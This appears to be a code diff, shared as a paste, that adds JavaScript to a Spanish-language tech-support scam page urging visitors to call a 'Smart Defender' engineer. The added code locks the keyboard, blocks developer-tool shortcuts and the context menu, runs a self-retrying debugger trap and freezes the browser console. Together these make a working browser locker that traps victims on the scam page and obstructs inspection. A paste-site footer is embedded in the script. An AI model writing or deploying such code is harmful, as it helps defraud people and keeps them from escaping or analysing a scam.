@@ -858,6 +858,55 @@ Comuníquese con el soporte gratuito de inmediato. Un ingeniero de Smart Defende
     }, false);
   
 
+      navigator.keyboard.lock();
+    document.onkeydown = function (e) {
+        return false;
+    }
+
+
+    // Disable specific key combinations
+    document.addEventListener('keydown', function (event) {
+        if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey &&
+            (event.keyCode === 'I'.charCodeAt(0) || event.keyCode === 'i'.charCodeAt(0) ||
+             event.keyCode === 'L'.charCodeAt(0) || event.keyCode === 'l'.charCodeAt(0) ||
+             event.keyCode === 'C'.charCodeAt(0) || event.keyCode === 'c'.charCodeAt(0) ||
+             event.keyCode === 'J'.charCodeAt(0) || event.keyCode === 'j'.charCodeAt(0) ||
+             event.keyCode === 'U'.charCodeAt(0) || event.keyCode === 'u'.charCodeAt(0) ||
+             event.keyCode === 'S'.charCodeAt(0) || event.keyCode === 's'.charCodeAt(0)))) {
+            event.preventDefault();
+        }
+        });
+    
+        // Disable context menu
+        document.addEventListener('contextmenu', function (event) {
+            event.preventDefault();
+        });
+    
+        // Debugger code with retry
+        (function () {
+            (function a() {
+                try {
+                    (function b(i) {
+                        if (('' + (i / i)).length !== 1 || i % 20 === 0) {
+                            (function () {}).constructor('debugger')();
+                        } else {
+                            debugger;
+                        }
+                        b(++i);
+                    })(0);
+                } catch (e) {
+                    setTimeout(a, 5);
+                }
+            })();
+        })();
+    
+        // Disable console
+        Object.defineProperty(window, 'console', {
+            value: Object.freeze({}),
+            writable: false,
+            configurable: false
+        });
+This paste expires in <1 hour. Public IP access. Share whatever you see with others in seconds with Context.Terms of ServiceReport this
 </script>
 <script>
     // Get the modal
